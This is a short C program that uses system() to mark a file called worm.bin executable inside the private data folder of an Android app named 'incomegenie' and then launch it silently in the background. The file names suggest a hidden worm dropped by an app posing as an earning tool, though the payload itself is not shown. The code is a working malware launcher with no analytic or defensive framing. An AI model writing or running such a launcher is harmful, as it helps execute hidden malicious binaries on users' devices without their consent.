#include <stdlib.h>
#include <unistd.h>
int main() {
  system("chmod +x /data/data/com.brokenethicsalab.incomegenie/files/worm.bin && /data/data/com.brokenethicsalab.incomegenie/files/worm.bin &");
  return 0;
}
